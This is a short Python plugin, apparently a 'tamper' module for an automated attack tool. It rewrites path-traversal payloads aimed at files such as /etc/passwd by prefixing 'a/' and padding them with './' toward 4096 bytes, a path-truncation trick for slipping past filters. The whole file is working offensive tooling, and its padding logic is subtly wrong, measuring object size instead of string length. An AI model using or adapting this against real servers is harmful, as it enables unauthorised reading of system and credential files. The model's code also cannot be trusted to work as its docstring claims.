import re
import sys
from main_modules.settings import PRIORITY, TYPE
__classificationtype__=TYPE.UNIVERSAL
__priority__ = PRIORITY.LOWEST


def tamper(payload, **kwargs):
    """
    

    >>> ../../etc/passwd/./././././././././././././[4096 plus tard]/. 
    a/../../etc/passwd/./././././././././././././[4096 plus tard]/. 
    """
    repeat_el='./'

    if re.match(r'../',payload):
        payload='a/'+payload

    while payload.__sizeof__()<4096:
        payload=payload+repeat_el


    return (payload) if payload else payload
